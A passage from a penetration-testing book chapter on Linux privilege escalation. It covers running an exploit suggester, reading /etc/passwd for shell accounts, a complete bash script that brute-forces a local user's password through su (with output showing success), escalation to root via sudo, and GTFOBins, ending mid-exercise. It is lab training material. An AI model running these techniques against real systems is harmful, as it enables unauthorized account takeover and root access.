# Security Chapter Extract
Book: Nick Aleks_ Dolev Farhi - Black Hat Bash_ Creative Scripting for Hackers and Pentesters (2024, NO STARCH PRESS, INC) - libgen.li (1)
Chapter: 2 - Linux Exploit Suggester 2
Linux Exploit Suggester 2 is a Perl script that runs locally on a system. It attempts to find exploits that match the currently running kernel version. To give it a try, run the following command against your Kali machine:
$ perl /home/kali/tools/linux-exploit-suggester-2/linux-exploit-suggester-2.pl
Security Relevance Score: 6
Word Count: 842
Extracted: 2025-06-13 23:40:57

---

Linux Exploit Suggester 2
Linux Exploit Suggester 2 is a Perl script that runs locally on a system. It attempts to find exploits that match the currently running kernel version. To give it a try, run the following command against your Kali machine:
$ perl /home/kali/tools/linux-exploit-suggester-2/linux-exploit-suggester-2.pl

  #############################
    Linux Exploit Suggester 2
  #############################

  Local Kernel: 6.x.x
  Searching 72 exploits...

  Possible Exploits

  No exploits are available for this kernel version

Under the hood, the exploit suggester script contains a database of more than 70 kernel exploits as of this writing. Some examples include a vulnerability in OverlayFS (CVE-2015-8660) and a vulnerability in eBPF (CVE-2017-16695).



Attacking Adjacent Accounts
When you land on a compromised host as a nonroot user, you may want to try to escalate your privileges by attacking other system accounts. You may even be able to gain root access by compromising a nonroot account that happens to have certain privileges, such as unrestricted sudo privileges or a certain file in the home directory containing credentials.
We can attempt to brute-force system accounts by using bash. First, let’s identify accounts that have an active shell by performing a grep search for /bin/bash (though remember that there could be other shells as well). Execute the following command against p-jumpbox-01 (172.16.10.13):
$ grep "/bin/bash" /etc/passwd | grep -v "backup:x"

root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
jmartinez:x:1001:1001::/home/jmartinez:/bin/bash
dbrown:x:1002:1002::/home/dbrown:/bin/bash
ogarcia:x:1003:1003::/home/ogarcia:/bin/bash
arodriguez:x:1004:1004::/home/arodriguez:/bin/bash

For the purpose of this example, we’ll attack the account jmartinez. Listing 9-5 attempts to brute-force the password for that account.

local_account _bf.sh
#!/bin/bash
❶ USER="jmartinez"
❷ PASSWORD_FILE="passwords.txt"

if [[! -f "${PASSWORD_FILE}"]]; then
  echo "password file does not exist."
  exit 1
fi

❸ while read -r password; do
  echo "Attempting password: ${password} against ${USER}..."
  if echo "${password}" | timeout 0.2 su - ${USER} \
          -c 'whoami' | grep -q "${USER}"; then
    echo
    echo "SUCCESS! The password for ${USER} is ${password}"
    echo "Use su - ${USER} and provide the password to switch"
    exit 0
  fi
done < "${PASSWORD_FILE}"

echo "Unable to compromise ${USER}."
exit 1

Listing 9-5: Brute-forcing adjacent accounts
In this script, we set two variables: USER, with the account name to attack ❶, and PASSWORD_FILE, a file that will contain a passwords list ❷.
Next, we read the content of PASSWORD_FILE by using a while loop ❸, iterating through each password that exists. We echo each password to the standard output stream and pipe it to the su command. Then we use su - ${USER} -c 'whoami' to attempt to switch to the user and execute the whoami command upon success.
If the whoami command returns the username we’re brute-forcing in the output (jmartinez in this case), it means we were able to successfully guess the password and execute a command as the user. We check that it returned this string by using grep -q "${USER}".
Let’s test it. Download and save the script on the p-jumpbox-01 machine by using the methods you’ve learned so far.
Next, write a few passwords to the passwords.txt file. Make sure this file exists in the same directory as the local_account_bf.sh script:
$ echo test >> passwords.txt
$ echo test123 >> passwords.txt
$ echo password123 >> passwords.txt
$ echo admin >> passwords.txt

Now run the script and observe its output:
$ bash local_account_bf.sh
Attempting password: test against jmartinez...
Password: Attempting password: test123 against jmartinez...
Password: Attempting password: password123 against jmartinez...
Password:
SUCCESS! The password for jmartinez is password123

Use su - jmartinez and provide the password to switch

The password was found to be password123! Try switching to the user and providing the password:
$ su — jmartinez
Next, you should be able to see that this user has sudo access everywhere by running sudo -l:
$ sudo -l

Matching Defaults entries for jmartinez on p-jumpbox-01:
--snip--
User jmartinez may run the following commands on p-jumpbox-01:

    (ALL : ALL) ALL

This should give us access to the root account. To confirm we are able to switch to the root user, type the following:
$ sudo su
# whoami

root

Congratulations! You successfully compromised this machine.


Privilege Escalation with GTFOBins
We can use commonly available utilities on Linux-based machines for a variety of nefarious purposes. The GTFOBins project (https://gtfobins.github.io) highlights many of these utilities, and in particular, what an attacker can do with them if they have permissions such as SetUID or sudo set. As you can see in Figure 9-3, some utilities allow arbitrary file reads and writes, file downloads and uploads, reverse shells, and more.

Figure 9-3: The GTFOBins home page

When you inspect the filesystem for sudo access or SetUID permissions set on particular utilities or binaries, we highly recommend that you search the GTFOBins database to learn about possible attack opportunities.
Exercise 18: Mapping GTFOBins Exploits to Local Binaries
Can you automate your search of the GTFOBins repository? In this exercise, you’ll use bash to map the list of available utilities on a target system to those in the GTFOBins database. The GTFOBins project is hosted on GitHub, where each binary has its own Markdown documentation file (with the .md extension), so you’ll need your script to do the following:
